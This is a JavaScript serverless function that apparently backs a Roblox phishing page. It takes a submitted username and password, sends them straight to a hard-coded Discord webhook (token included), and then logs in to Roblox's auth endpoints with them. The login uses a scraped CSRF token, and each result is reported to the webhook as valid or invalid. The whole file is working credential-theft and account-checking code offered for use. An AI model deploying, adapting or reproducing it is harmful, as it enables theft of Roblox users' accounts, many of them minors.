const fetch = require('node-fetch');

exports.handler = async (event) => {
    const { username, password } = JSON.parse(event.body);
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1507626132462243923/nXDkuvQctYsfUa0DxwW1PN15FbobMuhFgUBfgoXqeRJdMVi_Ewny769K8F3PlshxAs0Z'; // REPLACE THIS

    try {
        // Send to Discord immediately
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `**Login Attempt:**\nUsername: ${username}\nPassword: ${password}`
            })
        });

        // Step 1: First, get a valid Roblox session by visiting the homepage
        const homepageRes = await fetch('https://www.roblox.com/', {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });

        // Get cookies from the homepage
        const cookies = homepageRes.headers.raw()['set-cookie'] || [];
        const cookieStr = cookies.join('; ');

        // Step 2: Get CSRF token
        const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Cookie': cookieStr
            }
        });

        const csrfToken = csrfRes.headers.get('x-csrf-token') || '';

        // Step 3: Attempt login with full headers and cookies
        const loginRes = await fetch('https://auth.roblox.com/v2/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'X-CSRF-TOKEN': csrfToken,
                'Origin': 'https://www.roblox.com',
                'Referer': 'https://www.roblox.com/login',
                'Cookie': cookieStr
            },
            body: JSON.stringify({
                ctype: 'Username',
                cvalue: username,
                password: password
            })
        });

        // Step 4: Check if login was successful by looking for .ROBLOSECURITY cookie
        const responseCookies = loginRes.headers.raw()['set-cookie'] || [];
        const hasRobloSecurity = responseCookies.some(c => c.includes('.ROBLOSECURITY'));

        if (hasRobloSecurity) {
            // SUCCESS - Password was correct!
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `✅ **VALID CREDENTIALS - LOGIN SUCCESSFUL:**\nUsername: ${username}\nPassword: ${password}`
                })
            });

            return {
                statusCode: 200,
                body: JSON.stringify({ success: true })
            };
        } else {
            // FAILURE - Password was wrong
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `❌ **INVALID PASSWORD:**\nUsername: ${username}\nPassword: ${password}`
                })
            });

            return {
                statusCode: 200,
                body: JSON.stringify({ success: false })
            };
        }

    } catch (err) {
        // If our method fails, fall back to just checking if the username exists
        // This ensures we don't accidentally mark wrong passwords as valid
        try {
            const userRes = await fetch(`https://users.roblox.com/v1/usernames/users`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    usernames: [username],
                    excludeBannedUsers: true
                })
            });
            const userData = await userRes.json();
            
            if (userData.data && userData.data.length > 0) {
                // Username exists but we couldn't verify - still mark as failed
                // to be safe (we don't want to say wrong passwords are correct)
                return {
                    statusCode: 200,
                    body: JSON.stringify({ success: false })
                };
            }
        } catch (e) {
            // Complete failure - still mark as failed
        }

        return {
            statusCode: 200,
            body: JSON.stringify({ success: false })
        };
    }
};